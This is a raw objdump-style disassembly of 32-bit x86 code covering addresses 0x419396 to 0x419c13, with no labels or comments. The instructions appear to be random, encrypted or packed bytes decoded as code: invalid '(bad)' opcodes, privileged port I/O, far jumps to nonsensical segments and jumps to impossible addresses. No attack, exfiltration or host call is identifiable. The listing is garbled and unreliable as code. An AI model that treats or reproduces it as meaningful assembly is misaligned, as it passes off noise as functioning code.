  419396:	add    al,BYTE PTR [edx]
  419398:	inc    BYTE PTR [edi]
  41939a:	leave  
  41939b:	pinsrw mm1,edi,0xcc
  41939f:	in     al,0xee
  4193a1:	jmp    0x419396
  4193a3:	sti    
  4193a4:	mov    ebx,0xedcef1f9
  4193a9:	cli    
  4193aa:	mul    ebx
  4193ac:	jmp    0x412837b
  4193b1:	add    bh,BYTE PTR [edi-0x2fff2719]
  4193b7:	in     eax,0xc9
  4193b9:	(bad)  
  4193ba:	jecxz  0x419390
  4193bc:	int    0xc4
  4193be:	jmp    0x4193b3
  4193c0:	int3   
  4193c1:	out    dx,eax
  4193c2:	div    BYTE PTR [ebp-0x4d133915]
  4193c8:	(bad)  
  4193c9:	icebp  
  4193ca:	mov    ecx,0xfdceb4b2
  4193cf:	aam    0x1
  4193d1:	sar    BYTE PTR [edi-0x321092a],1
  4193d7:	mov    esi,0x60abc0b
  4193dc:	add    eax,0xcde4c807
  4193e1:	fsubrp st(5),st
  4193e3:	loope  0x419396
  4193e5:	int    0xd2
  4193e7:	xlat   BYTE PTR ds:[ebx]
  4193e8:	in     al,dx
  4193e9:	jmp    0xdedb:0xdcb4cfbb
  4193f0:	fmul   st,st(5)
  4193f2:	lock icebp 
  4193f4:	fsubrp st(1),st
  4193f6:	add    bl,al
  4193f8:	loope  0x4193d2
  4193fa:	add    bh,cl
  4193fc:	(bad)  
  4193fe:	loop   0x4193e4
  419400:	mov    edi,0xe5e6c0d3
  419405:	shl    DWORD PTR [edi-0x44250b0e],0xeb
  41940c:	(bad)  
  41940d:	in     eax,dx
  41940e:	jmp    0xbc0080ec
  419413:	lock loopne 0x41941d
  419416:	fcom   st(4)
  419418:	cli    
  419419:	leave  
  41941a:	in     eax,dx
  41941b:	add    ebx,edi
  41941d:	out    dx,al
  41941e:	shl    BYTE PTR [edx-0x4d541c21],1
  419424:	sti    
  419425:	xlat   BYTE PTR ds:[ebx]
  419426:	in     eax,dx
  419427:	call   0xcc076711
  41942c:	clc    
  41942d:	add    esi,esi
  41942f:	inc    DWORD PTR [esi]
  419431:	loope  0x419417
  419433:	(bad)  
  419434:	stc    
  419435:	jmp    0xef08:0xc7db00e6
  41943c:	add    eax,0xcabedcd2
  419441:	mov    cl,0xf7
  419443:	imul   esi
  419445:	mov    dl,0xc5
  419447:	push   ebp
  419449:	push   DWORD PTR [ebx-0x24001234]
  41944f:	sar    BYTE PTR [eax+eax*8+0x5ffd7c6],0xff
  419457:	(bad)  
  419458:	retf   0xcbf5
  41945b:	push   cs
  41945c:	add    eax,DWORD PTR [esi]
  41945e:	loope  0x419421
  419460:	in     al,dx
  419461:	(bad)  
  419462:	scas   eax,DWORD PTR es:[edi]
  419463:	int    0xcb
  419465:	ret    0xdab2
  419468:	mov    cl,0xb8
  41946a:	mov    eax,0xfdf9b8d3
  41946f:	into   
  419470:	add    edi,esp
  419472:	vpsubw xmm2,xmm4,xmm0
  419476:	or     bl,cl
  419478:	leave  
  419479:	in     eax,0xef
  41947b:	(bad)  
  41947c:	loopne 0x419451
  41947e:	ret    0xe0e2
  419481:	repnz repnz lods eax,DWORD PTR ds:[esi]
  419484:	shl    edx,0xca
  419487:	rcr    edx,1
  419489:	iret   
  41948a:	mov    bl,0xb8
  41948c:	stc    
  41948d:	clc    
  41948e:	lock mov ebp,0xd6fbf7c2
  419494:	add    eax,0xc0cb07d7
  419499:	add    ah,cl
  41949b:	or     al,0xf
  41949d:	jmp    0xef1f624b
  4194a2:	icebp  
  4194a3:	hlt    
  4194a4:	sti    
  4194a5:	mov    dh,0xb3
  4194a7:	leave  
  4194a8:	out    dx,al
  4194a9:	lods   al,BYTE PTR ds:[esi]
  4194aa:	in     al,0xcb
  4194ac:	add    ebx,ecx
  4194ae:	(bad)  
  4194af:	rol    bh,cl
  4194b1:	fucomp st(5)
  4194b3:	mov    esp,0xd8f8fb05
  4194b8:	fsub   st,st(0)
  4194ba:	ret    
  4194bb:	fprem  
  4194bd:	adc    ebx,esi
  4194bf:	(bad)  
  4194c0:	shr    esp,1
  4194c2:	div    BYTE PTR [ebp+eiz*8-0x434153f]
  4194c9:	shl    DWORD PTR [ebp-0xf4b3447],cl
  4194cf:	rol    DWORD PTR [edx],1
  4194d1:	ret    0xdbff
  4194d4:	xlat   BYTE PTR ds:[ebx]
  4194d5:	stc    
  4194d6:	in     al,0xfc
  4194d8:	psubw  mm1,QWORD PTR [ebx+ebx*8]
  4194dc:	fisttp DWORD PTR [edx]
  4194de:	(bad)
  4194e1:	enter  0xf0ee,0xcd
  4194e5:	into   
  4194e6:	(bad)  
  4194e7:	(bad)  
  4194e9:	mov    ecx,0xf3b8f2d2
  4194ee:	add    ebp,esp
  4194f0:	cli    
  4194f1:	add    ah,bl
  4194f3:	icebp  
  4194f4:	rol    cl,cl
  4194f6:	aad    0xda
  4194f8:	mov    DWORD PTR ds:0xe909ca,0xf6aca6b1
  419502:	out    dx,al
  419503:	leave  
  419504:	loop   0x4194ef
  419506:	frstpm(287 only) 
  419508:	sti    
  419509:	mov    eax,0xb4ead3f9
  41950e:	mov    edi,0xe2def4d9
  419513:	hlt    
  419514:	lock in al,0xdc
  419517:	ret    0xe6c5
  41951a:	bswap  eax
  41951c:	or     eax,ebp
  41951e:	scas   al,BYTE PTR es:[edi]
  41951f:	ret    
  419520:	(bad)  
  419521:	in     al,0xb6
  419523:	mov    ch,0xb0
  419525:	hlt    
  419526:	cmc    
  419527:	ffreep st(7)
  419529:	xlat   BYTE PTR ds:[ebx]
  41952a:	vpminsw xmm6,xmm0,xmm0
  41952e:	not    ebp
  419530:	mul    cl
  419532:	(bad)  
  419533:	add    al,0xf9
  419535:	xlat   BYTE PTR ds:[ebx]
  419536:	jmp    0xf0b9e30
  41953b:	in     al,dx
  41953c:	int    0xf1
  41953e:	loope  0x419518
  419540:	in     al,dx
  419541:	out    0xd3,al
  419543:	retf   
  419544:	sti    
  419545:	hlt    
  419546:	stc    
  419547:	mov    ebx,0xfad2e6d9
  41954c:	mov    ebx,0xdfdbd4ef
  419551:	neg    bl
  419553:	loop   0x41952a
  419555:	(bad)  
  419556:	in     eax,0xdd
  419558:	lds    eax,FWORD PTR [edx]
  41955a:	add    eax,0xefcd01d4
  41955f:	in     eax,dx
  419560:	repz jmp 0x41952e
  419563:	mov    ch,0xe8
  419565:	cli    
  419566:	jmp    0xe9d0:0xf5b8e5da
  41956d:	mov    al,0xcc
  41956f:	enter  0x5b9,0xc6
  419573:	add    cl,bl
  419575:	shl    ah,cl
  419577:	ret    0xe7f4
  41957a:	jmp    ecx
  41957c:	call   0xf804488f
  419581:	(bad)  
  419583:	in     al,0xda
  419585:	test   al,0xf2
  419587:	mov    ch,0xb7
  419589:	(bad)  
  41958a:	mov    dh,0xbe
  41958c:	std    
  41958d:	into   
  41958e:	rcr    al,1
  419590:	aam    0xc7
  419592:	mov    esp,0xfafbe4c7
  419597:	aad    0xfe
  419599:	or     esp,ebx
  41959b:	push   cs
  41959c:	sti    
  41959d:	pop    es
  41959e:	fcomp  st(7)
  4195a0:	fucom  st(4)
  4195a2:	ret    
  4195a3:	in     eax,0xd2
  4195a5:	(bad)  [ecx-0xd0a520b]
  4195ab:	fst    st(1)
  4195ad:	hlt    
  4195ae:	fcmovnu st,st(7)
  4195b0:	loopne 0x41957e
  4195b2:	mov    ebp,0x5f7e402
  4195b7:	loopne 0x4195a0
  4195b9:	(bad)  [ecx]
  4195bb:	vpsubsb ymm0,ymm2,ymm1
  4195bf:	mov    bl,0xbc
  4195c1:	scas   eax,DWORD PTR es:[edi]
  4195c2:	loope  0x4195bf
  4195c4:	call   0xfa3877ad
  4195c9:	cmc    
  4195ca:	(bad)  
  4195cb:	icebp  
  4195cc:	mov    ch,0xb9
  4195ce:	fdivp  st(6),st
  4195d0:	fstp   TBYTE PTR [eax-0x2b3dfc24]
  4195d6:	add    al,0xdf
  4195d8:	rol    bh,0xd8
  4195db:	push   es
  4195dc:	loope  0x4195ef
  4195de:	(bad)
  4195e1:	lock mov dh,0xb7
  4195e4:	lods   eax,DWORD PTR ds:[esi]
  4195e5:	xbegin 0xf1338bd3
  4195eb:	idiv   DWORD PTR [edx-0x122e1c16]
  4195f1:	fcmove st,st(5)
  4195f3:	fst    st(3)
  4195f5:	(bad)  
  4195f6:	imul   bh
  4195f8:	jecxz  0x4195dc
  4195fa:	out    dx,al
  4195fb:	fcomp  st(6)
  4195fd:	(bad)  
  4195fe:	in     al,dx
  4195ff:	mov    eax,0xacc6aed1
  419604:	shl    esp,1
  419606:	div    eax
  419608:	into   
  419609:	lock in eax,dx
  41960b:	fcmovnbe st,st(5)
  41960d:	add    edi,ebx
  41960f:	test   esp,0xd1d8e507
  419615:	rcr    ebx,1
  419617:	mul    ah
  419619:	dec    DWORD PTR [edx]
  41961b:	cld    
  41961c:	add    BYTE PTR [ebx],al
  41961e:	test   al,0xde
  419620:	loopne 0x4195ee
  419622:	leave  
  419623:	sti    
  419624:	les    edi,FWORD PTR [edx-0x440d3605]
  41962a:	int    0xd7
  41962c:	jmp    0xf9d4:0xcdd0fabf
  419633:	add    al,dl
  419635:	cld    
  419636:	retf   
  419637:	out    0x3,al
  419639:	ror    dh,0xf3
  41963c:	add    al,BYTE PTR [ecx]
  41963e:	mov    esi,0xb1a4c9ad
  419643:	mov    al,0xd6
  419645:	call   0xea126b03
  41964a:	stc    
  41964b:	fdivr  QWORD PTR [edi-0x2b320a1f]
  419651:	aad    0x1
  419653:	icebp  
  419654:	faddp  st(5),st
  419656:	jmp    0x419657
  419658:	pop    es
  419659:	in     eax,0x4
  41965b:	or     DWORD PTR [edi],ecx
  41965d:	int    0xee
  41965f:	fidiv  WORD PTR [ecx-0x2e0f2850]
  419665:	mov    ch,0xb3
  419667:	lock idiv al
  41966a:	out    dx,eax
  41966b:	(bad)  
  41966c:	jmp    0xedf8:0xdff5f8d2
  419673:	test   al,0xfe
  419676:	fucomip st,st(1)
  419678:	fsubp  st(3),st
  41967a:	aam    0x3
  41967c:	into   
  41967d:	in     al,0xe7
  41967f:	enter  0xb6f1,0xca
  419683:	in     al,dx
  419684:	int    0xc6
  419686:	mov    dl,0xf7
  419688:	out    0xbb,al
  41968a:	(bad)  
  41968c:	stc    
  41968d:	hlt    
  41968e:	repnz sar al,1
  419691:	fdivr  st(0),st
  419693:	int3   
  419694:	retf   
  419695:	(bad)  
  419696:	std    
  419697:	add    eax,0x60bbc02
  41969c:	out    0xc0,al
  41969e:	repnz loopne 0x419658
  4196a1:	loope  0x419668
  4196a3:	mov    cl,0xb6
  4196a5:	repz (bad) 
  4196a7:	fnstcw WORD PTR [eax-0x3142513]
  4196ad:	out    dx,eax
  4196ae:	sar    DWORD PTR [edi-0x52b3c2c],0xdb
  4196b5:	ret    
  4196b6:	loop   0x4196a8
  4196b8:	retf   0xd9ce
  4196bb:	add    edi,ebp
  4196bd:	jecxz  0x41967f
  4196bf:	lock out 0xea,al
  4196c2:	mov    dh,0xd6
  4196c4:	ret    0xb1c1
  4196c7:	in     eax,0xb9
  4196c9:	hlt    
  4196ca:	int    0xef
  4196cc:	int    0xd1
  4196ce:	stc    
  4196cf:	add    dl,bh
  4196d1:	into   
  4196d2:	loope  0x41968e
  4196d4:	fdivr  DWORD PTR [eax-0x39161029]
  4196da:	push   cs
  4196db:	(bad)  
  4196dd:	or     al,0xdd
  4196df:	mov    al,0xeb
  4196e1:	mov    esi,0xd7e1c0f5
  4196e6:	sar    DWORD PTR [edx-0x4a0d0738],cl
  4196ec:	fdiv   st,st(3)
  4196ee:	mov    ecx,0xf9d2ee02
  4196f3:	jecxz  0x4196ff
  4196f5:	lock loopne 0x419700
  4196f8:	ror    DWORD PTR [ebx],0xdb
  4196fb:	add    al,0xec
  4196fd:	les    ebp,FWORD PTR [esi+ebx*8-0x2d173258]
  419704:	rcl    esp,cl
  419706:	aad    0xdb
  419708:	div    BYTE PTR [esi-0x100022c]
  41970e:	fstp   st(7)
  419710:	cmc    
  419711:	aad    0x1
  419713:	add    bl,cl
  419715:	cli    
  419716:	fcmovbe st,st(6)
  419718:	jecxz  0x41971b
  41971a:	(bad)  
  41971b:	out    dx,al
  41971c:	repz retf 
  41971e:	shr    bl,1
  419720:	lock mov cl,0xe3
  419723:	mov    bh,0xcc
  419725:	mov    cl,0xb1
  419727:	mov    ebx,0xfdf6f5ec
  41972c:	add    edx,eax
  41972e:	cli    
  41972f:	(bad)  
  419730:	repz stc 
  419732:	rcr    al,cl
  419734:	(bad)  
  419735:	test   DWORD PTR [ebx],0xdebdca
  41973b:	loopne 0x41974b
  41973d:	push   cs
  41973e:	mov    dl,0xd1
  419740:	shl    BYTE PTR [edx-0x2b351a53],1
  419746:	out    dx,al
  419747:	mul    esp
  419749:	call   0xf1fc4d26
  41974e:	int3   
  41974f:	iret   
  419750:	jecxz  0x41972a
  419752:	sar    ebx,0xc7
  419755:	mov    esp,0x30ac6d6
  41975a:	fimul  DWORD PTR [edx]
  41975c:	bnd repz jmp 0x419737
  419760:	fsubr  st(7),st
  419762:	aam    0xd7
  419764:	lds    esi,FWORD PTR [ebp-0x2f483937]
  41976a:	neg    edx
  41976c:	rcl    esi,1
  41976e:	add    eax,DWORD PTR [edi]
  419770:	ret    
  419771:	ret    
  419772:	out    0xbe,eax
  419774:	add    esp,esi
  419776:	jmp    0x6248d66
  41977b:	stc    
  41977c:	in     eax,0xff
  41977e:	mov    esi,0xcae6d2b0
  419783:	ret    
  419784:	(bad)  
  419785:	enter  0xcff6,0xe9
  419789:	std    
  41978a:	div    al
  41978c:	shr    edx,cl
  41978e:	not    al
  419790:	cli    
  419791:	mov    eax,0x7ffc4f8
  419796:	or     cl,BYTE PTR [ebx]
  419798:	mov    ebp,0xbc6d4ce
  41979d:	call   ebx
  41979f:	mov    esp,0xd4f3e2d1
  4197a4:	hlt    
  4197a5:	div    BYTE PTR [ecx-0x2e2d0505]
  4197ab:	shr    edx,1
  4197ad:	shl    bl,1
  4197af:	loop   0x419794
  4197b1:	fcmovu st,st(1)
  4197b3:	mov    esp,0xe2c6dae7
  4197b8:	(bad)  
  4197ba:	leave  
  4197bb:	(bad)  
  4197bc:	rol    DWORD PTR [ebx],cl
  4197be:	fsubr  QWORD PTR [esp+ebp*8-0x531e4f3b]
  4197c5:	mov    ebx,0xeeeddfbb
  4197ca:	cmc    
  4197cb:	into   
  4197cc:	retf   0xd4d8
  4197cf:	hlt    
  4197d0:	test   DWORD PTR [eax],0xe5d3e501
  4197d6:	in     al,0xe4
  4197d8:	or     bh,ch
  4197da:	inc    dl
  4197dc:	in     al,0x3
  4197de:	out    dx,al
  4197df:	rcl    ecx,1
  4197e1:	shl    esi,0xe8
  4197e4:	fcomi  st,st(1)
  4197e6:	shl    DWORD PTR [esp+ecx*8-0x23331449],0xc9
  4197ee:	mov    bh,0xb8
  4197f0:	cli    
  4197f1:	fsubr  st,st(5)
  4197f3:	aad    0xc4
  4197f5:	aad    0xf4
  4197f7:	out    0xff,al
  4197f9:	loope  0x4197be
  4197fb:	loope  0x4197f9
  4197fd:	rep lods al,BYTE PTR ds:[esi]
  4197ff:	(bad)
  419802:	into   
  419803:	in     eax,0xd7
  419805:	mov    al,0xf0
  419807:	scas   al,BYTE PTR es:[edi]
  419808:	int3   
  419809:	(bad)  
  41980a:	jmp    0xd7d9:0xc8b9d4d1
  419811:	jecxz  0x4197ce
  419813:	add    edx,edx
  419815:	mul    ah
  419817:	(bad)  
  419819:	(bad)  
  41981a:	iret   
  41981b:	fimul  DWORD PTR [edi]
  41981d:	add    eax,ebx
  41981f:	(bad)  
  419820:	int    0xf3
  419822:	mov    al,0xe3
  419824:	iret   
  419825:	fld    st(0)
  419827:	icebp  
  419828:	cli    
  419829:	mov    edi,0xbebfe3d7
  41982e:	sti    
  41982f:	out    0x1,eax
  419831:	mov    esi,0xafae1e3
  419836:	(bad)  
  419837:	fld    st(7)
  419839:	retf   
  41983a:	in     eax,0xca
  41983c:	loop   0x419837
  41983e:	rcr    edi,0xe9
  419841:	lods   al,BYTE PTR ds:[esi]
  419842:	retf   
  419843:	mov    ch,0xb4
  419846:	in     al,0xd3
  419848:	mov    edx,0xecf0c5fa
  41984d:	(bad)  
  41984e:	hlt    
  41984f:	in     eax,dx
  419850:	push   es
  419851:	(bad)  
  419852:	cld    
  419853:	add    bl,bh
  419855:	loope  0x41982f
  419857:	(bad)  
  419858:	or     ebp,esi
  41985a:	or     eax,0xa7dac101
  41985f:	xlat   BYTE PTR ds:[ebx]
  419860:	scas   al,BYTE PTR es:[edi]
  419861:	jmp    0xd4e1:0xd4edb0b1
  419868:	hlt    
  419869:	fidivr DWORD PTR [edi-0x3c33302e]
  41986f:	mov    eax,0xd0f106fe
  419874:	retf   
  419875:	(bad)  
  419877:	(bad)  
  419879:	push   cs
  41987a:	jmp    0x41985f
  41987c:	(bad)  
  41987d:	jmp    0xdbed:0xc8d0ccc4
  419884:	cli    
  419885:	fcmovnbe st,st(5)
  419887:	(bad)  
  419889:	aam    0xc8
  41988b:	rcr    edi,cl
  41988d:	enter  0xd6cc,0xbc
  419891:	hlt    
  419892:	loop   0x419895
  419894:	loop   0x419872
  419896:	aam    0xcb
  419898:	out    dx,eax
  419899:	or     bh,al
  41989b:	or     al,0xc
  41989d:	loope  0x419857
  41989f:	mov    dl,0xdf
  4198a1:	scas   al,BYTE PTR es:[edi]
  4198a2:	ret    
  4198a3:	out    dx,eax
  4198a4:	in     eax,0xe7
  4198a6:	into   
  4198a7:	rcl    ecx,cl
  4198a9:	(bad)  
  4198aa:	retf   0xf9dc
  4198ad:	leave  
  4198ae:	(bad)  
  4198b0:	fcmovnbe st,st(5)
  4198b2:	loopne 0x4198b2
  4198b4:	div    ch
  4198b6:	aam    0xe7
  4198b8:	(bad)  
  4198ba:	push   cs
  4198bb:	enter  0xdedf,0xaa
  4198bf:	les    esi,FWORD PTR [edi-0x32113f4e]
  4198c5:	mov    al,0xb5
  4198c7:	mov    dl,0xd6
  4198c9:	les    esi,FWORD PTR [edi-0xf24101d]
  4198cf:	rcr    dh,1
  4198d1:	loop   0x4198c6
  4198d3:	rcl    esp,cl
  4198d5:	mov    eax,0xefd4f808
  4198da:	or     ebx,ecx
  4198dc:	adc    ecx,ebp
  4198de:	in     al,dx
  4198df:	sar    BYTE PTR [edi-0x522e4935],cl
  4198e5:	mov    edx,0xf7b9f4e7
  4198ea:	mov    bl,0xda
  4198ec:	mov    cl,0xf7
  4198ee:	iret   
  4198ef:	cmc    
  4198f0:	mov    ecx,0x5fec5ce
  4198f5:	fmul   QWORD PTR [ebx]
  4198f7:	out    dx,eax
  4198f8:	jmp    0xd930930c
  4198fd:	leave  
  4198fe:	into   
  4198ff:	jmp    0x4198e7
  419901:	shl    edi,1
  419903:	ret    
  419904:	lock mov dh,0xc5
  419907:	in     al,dx
  419908:	into   
  419909:	cli    
  41990a:	int3   
  41990b:	sar    BYTE PTR [ebx-0x2831252c],1
  419911:	cld    
  419912:	(bad)  
  419914:	jmp    0xff04:0xc5e0c1
  41991b:	cld    
  41991c:	or     bl,cl
  41991e:	retf   
  41991f:	mov    eax,0xb7eef3d2
  419924:	sti    
  419925:	shl    DWORD PTR [ebp-0x154a4917],cl
  41992b:	retf   
  41992c:	sti    
  41992d:	mov    ebx,0xfcd8d1d0
  419932:	imul   ebx
  419934:	cld    
  419935:	retf   
  419936:	cli    
  419937:	not    ebp
  419939:	out    0xf,eax
  41993b:	fimul  WORD PTR [edi]
  41993d:	into   
  41993e:	rcr    ah,1
  419940:	mov    bl,0xc0
  419942:	out    0xac,al
  419944:	call   0xee1d6e22
  419949:	(bad)  
  41994b:	mov    ch,0xbd
  41994d:	call   0xdd227d4d
  419952:	aad    0xbc
  419954:	add    esp,edi
  419956:	jmp    0xef41785e
  41995b:	or     bl,ch
  41995d:	(bad)  
  41995f:	in     eax,0xe3
  419961:	scas   eax,DWORD PTR es:[edi]
  419962:	(bad)  
  419964:	les    esi,FWORD PTR [ebp-0x2214a51]
  41996a:	(bad)  
  41996c:	in     al,dx
  41996d:	jecxz  0x419940
  41996f:	std    
  419970:	into   
  419971:	add    eax,0xe2f8fef5
  419976:	ret    
  419977:	out    0xc8,al
  419979:	or     eax,0xebfbefe4
  41997e:	jmp    0xe82c462b
  419983:	loopne 0x419946
  419985:	(bad)  
  419986:	cli    
  419987:	cli    
  419988:	clc    
  419989:	sar    ebp,1
  41998b:	lock in al,dx
  41998d:	ret    0x1ef
  419990:	fcmovnbe st,st(5)
  419992:	jecxz  0x419969
  419994:	in     eax,0x5
  419996:	(bad)  
  419997:	or     ecx,DWORD PTR [ebx]
  419999:	or     eax,0xdca0d0b
  41999e:	(bad)  
  41999f:	repz rcr esp,0xf6
  4199a3:	retf   
  4199a4:	mov    bh,0xc8
  4199a6:	leave  
  4199a7:	mov    eax,0xd1e4e6b4
  4199ac:	rcr    ebp,1
  4199ae:	mov    bh,0xfd
  4199b0:	shl    dh,1
  4199b2:	loopne 0x4199b0
  4199b4:	cmc    
  4199b5:	aam    0xfb
  4199b7:	std    
  4199b8:	(bad)  
  4199b9:	cld    
  4199ba:	push   es
  4199bb:	push   es
  4199bc:	ud2    
  4199be:	fmul   st,st(5)
  4199c0:	test   esi,0xc9f6c7c5
  4199c6:	shl    esi,cl
  4199c8:	mov    edx,0xcdeed2b6
  4199cd:	aam    0xee
  4199cf:	out    dx,eax
  4199d0:	fmul   st(6),st
  4199d2:	in     eax,0xd0
  4199d4:	ret    
  4199d5:	fucom  st(6)
  4199d7:	retf   0xcf0f
  4199da:	aam    0xd
  4199dc:	fxch   st(7)
  4199de:	ret    
  4199df:	fsubr  DWORD PTR [ebx+eiz*8-0x3f341331]
  4199e6:	fnstenv [edx-0x4327482d]
  4199ec:	int3   
  4199ed:	iret   
  4199ee:	mov    esi,0xdeeed107
  4199f3:	icebp  
  4199f4:	out    0xe3,al
  4199f6:	retf   
  4199f7:	loop   0x4199d2
  4199f9:	inc    BYTE PTR [ebx+eiz*8]
  4199fc:	enter  0xae0e,0xd8
  419a00:	ffree  st(2)
  419a02:	(bad)  
  419a03:	retf   
  419a04:	cmc    
  419a05:	shl    bh,1
  419a07:	repnz in eax,0xeb
  419a0a:	(bad)  
  419a0b:	out    dx,eax
  419a0c:	(bad)  
  419a0e:	ret    
  419a0f:	sti    
  419a10:	cmc    
  419a11:	push   es
  419a12:	(bad)  
  419a13:	fiadd  DWORD PTR [edx+eax*1]
  419a16:	or     bl,dh
  419a18:	push   cs
  419a19:	dec    DWORD PTR [edx]
  419a1b:	push   es
  419a1c:	or     BYTE PTR [ebx],cl
  419a1e:	in     eax,dx
  419a1f:	rcr    bh,0xa8
  419a22:	aam    0xe9
  419a24:	out    0xd1,eax
  419a26:	in     eax,dx
  419a27:	out    0xd4,eax
  419a29:	neg    bl
  419a2b:	sar    BYTE PTR [ebx-0x1d0b0b13],1
  419a31:	shl    ebx,1
  419a33:	or     esp,ebp
  419a35:	lock (bad) 
  419a38:	shl    esp,0xfa
  419a3b:	push   es
  419a3c:	paddsw mm7,QWORD PTR [ebp-0x435b1652]
  419a43:	shr    cl,cl
  419a45:	jmp    0xca324b2e
  419a4a:	call   0xe130833f
  419a4f:	(bad)  
  419a50:	mov    edi,0x7f70401
  419a55:	fcmovnu st,st(6)
  419a57:	out    dx,eax
  419a58:	std    
  419a59:	fdivr  st(4),st
  419a5b:	aam    0xf9
  419a5d:	add    al,0xee
  419a5f:	in     al,dx
  419a60:	shl    ebx,1
  419a62:	cmc    
  419a63:	out    dx,eax
  419a64:	icebp  
  419a65:	(bad)  
  419a66:	(bad)  
  419a67:	shl    al,cl
  419a69:	in     eax,0xfd
  419a6b:	fidivr DWORD PTR [ebp-0x7f80e06]
  419a71:	fild   WORD PTR [eax+esi*8]
  419a74:	retf   
  419a75:	add    eax,DWORD PTR [eax]
  419a77:	jecxz  0x419a4d
  419a79:	jmp    0xe40e6957
  419a7e:	ret    0xa8bf
  419a81:	out    0xd5,eax
  419a83:	mov    dh,0xeb
  419a85:	cmc    
  419a86:	fidiv  DWORD PTR [edi+ecx*8-0xd262f37]
  419a8d:	in     al,dx
  419a8e:	cli    
  419a8f:	(bad)  
  419a91:	add    ch,ah
  419a93:	aad    0xf9
  419a95:	rcr    ah,1
  419a97:	loopne 0x419a9e
  419a99:	fadd   QWORD PTR [esi]
  419a9b:	in     eax,0xfb
  419a9d:	jmp    0xce2b6c6c
  419aa2:	lods   al,BYTE PTR ds:[esi]
  419aa3:	in     eax,dx
  419aa4:	lock out dx,eax
  419aa6:	loopne 0x419a7e
  419aa8:	in     eax,0xbf
  419aaa:	shl    dl,cl
  419aac:	jmp    0xcdf1:0xbcf7f7d4
  419ab3:	(bad)  
  419ab5:	ret    
  419ab6:	test   bl,0xd7
  419ab9:	cmc    
  419aba:	loop   0x419a88
  419abc:	cli    
  419abd:	rol    cl,cl
  419abf:	out    dx,al
  419ac0:	retf   0xeceb
  419ac3:	xlat   BYTE PTR ds:[ebx]
  419ac4:	lods   al,BYTE PTR ds:[esi]
  419ac5:	in     al,dx
  419ac6:	div    edi
  419ac8:	mov    ebx,0x2ddf9e8
  419acd:	repnz in eax,dx
  419acf:	lock ret 0xe5d4
  419ad3:	vcmpps xmm1,xmm0,XMMWORD PTR [eax],0xdc
  419ad8:	jmp    0xc606:0xfcac4e3
  419adf:	leave  
  419ae0:	(bad)  
  419ae2:	jecxz  0x419aa8
  419ae4:	iret   
  419ae5:	mov    cl,0xb6
  419ae8:	(bad)  
  419ae9:	fucomip st,st(0)
  419aeb:	jecxz  0x419ac9
  419aed:	int    0xed
  419aef:	cmc    
  419af0:	int    0xf7
  419af2:	fucom  st(3)
  419af4:	cmc    
  419af5:	call   eax
  419af7:	(bad)  
  419af8:	or     edx,ecx
  419afa:	jmp    0xc63e6903
  419aff:	(bad)  
  419b00:	repnz shr esp,1
  419b03:	rcl    esp,1
  419b05:	enter  0xf3f0,0xde
  419b09:	fnstsw WORD PTR [edx-0x3e1d2c15]
  419b0f:	call   eax
  419b11:	(bad)  
  419b13:	(bad)  
  419b14:	out    0x2,eax
  419b16:	ffreep st(6)
  419b18:	(bad)  
  419b19:	push   cs
  419b1a:	call   0xb93b752e
  419b1f:	xlat   BYTE PTR ds:[ebx]
  419b20:	mov    bh,0xf3
  419b22:	(bad)  
  419b23:	int3   
  419b24:	fcmovnu st,st(3)
  419b26:	retf   
  419b27:	mov    cl,0xcf
  419b29:	(bad)  [edi-0x4740454b]
  419b2f:	sti    
  419b30:	mov    ecx,0xdad9c3f0
  419b35:	cmc    
  419b36:	ret    
  419b37:	clc    
  419b38:	retf   
  419b39:	out    dx,eax
  419b3a:	(bad)  
  419b3c:	push   cs
  419b3d:	shr    ebx,cl
  419b3f:	out    dx,al
  419b40:	leave  
  419b41:	fsubrp st(4),st
  419b43:	mov    ch,0xb3
  419b45:	loope  0x419af6
  419b47:	mov    dl,0xd8
  419b49:	in     al,0xd5
  419b4b:	cld    
  419b4c:	fnstsw WORD PTR [ebp+0x7f2d3d2]
  419b52:	lock shl ebx,cl
  419b55:	cmc    
  419b56:	jmp    0xd0237f36
  419b5b:	add    edi,ecx
  419b5d:	call   0xca0b6b4c
  419b62:	int3   
  419b63:	in     eax,0xd3
  419b65:	mov    cl,0xe0
  419b67:	(bad)  
  419b68:	repnz mov bh,0xd6
  419b6b:	hlt    
  419b6c:	mov    ebx,0xd6c3dbee
  419b71:	cmc    
  419b72:	rcr    al,cl
  419b74:	add    eax,0xb04d006
  419b79:	add    al,0xe2
  419b7b:	out    0x0,al
  419b7d:	faddp  st(3),st
  419b7f:	scas   eax,DWORD PTR es:[edi]
  419b80:	(bad)
  419b83:	rol    edx,1
  419b85:	enter  0xc0eb,0xd2
  419b89:	aad    0xf1
  419b8b:	icebp  
  419b8c:	mov    ch,0xd5
  419b8e:	not    ebp
  419b90:	cmc    
  419b91:	cli    
  419b92:	ror    esp,1
  419b94:	test   DWORD PTR [esi],0x8fdddd9
  419b9a:	out    dx,eax
  419b9b:	or     esp,ecx
  419b9d:	fidiv  DWORD PTR [ebx-0x341f1609]
  419ba3:	in     eax,dx
  419ba4:	sar    ecx,1
  419ba6:	in     eax,0xd7
  419ba8:	mov    ebx,0xdbb2c9d6
  419bad:	in     eax,dx
  419bae:	ror    esp,cl
  419bb0:	repnz add eax,DWORD PTR [edx]
  419bb3:	xlat   BYTE PTR ds:[ebx]
  419bb4:	(bad)  
  419bb5:	loop   0x419b8c
  419bb7:	retf   0xd9ff
  419bba:	ret    
  419bbb:	add    eax,ecx
  419bbd:	loopne 0x419b67
  419bbf:	iret   
  419bc0:	mov    edi,0xfbc4c4c2
  419bc5:	aad    0xcd
  419bc7:	idiv   DWORD PTR [edi-0x4e292446]
  419bcd:	loope  0x419bc8
  419bcf:	test   esi,0xfac4f8d8
  419bd5:	add    al,0xf0
  419bd7:	or     al,ah
  419bd9:	(bad)  
  419bda:	in     al,0xc2
  419bdc:	adc    bl,dh
  419bde:	stos   DWORD PTR es:[edi],eax
  419bdf:	mov    ebp,0xebafb0a8
  419be4:	sar    BYTE PTR [ebx-0x24171351],1
  419bea:	std    
  419beb:	jmp    0xe9058ce0
  419bf0:	mov    ecx,0xdaccc1d6
  419bf5:	test   BYTE PTR ds:0x107e9e0,0xc
  419bfc:	retf   
  419bfd:	push   cs
  419bfe:	(bad)  
  419bff:	in     al,0xef
  419c01:	aad    0xad
  419c03:	xlat   BYTE PTR ds:[ebx]
  419c04:	in     eax,dx
  419c05:	shl    BYTE PTR [ebx-0x120c3239],1
  419c0b:	repz int 0xbc
  419c0e:	xlat   BYTE PTR ds:[ebx]
  419c0f:	fld    st(0)
  419c11:	fsubr  st(0),st
  419c13:	out    0xd7,eax
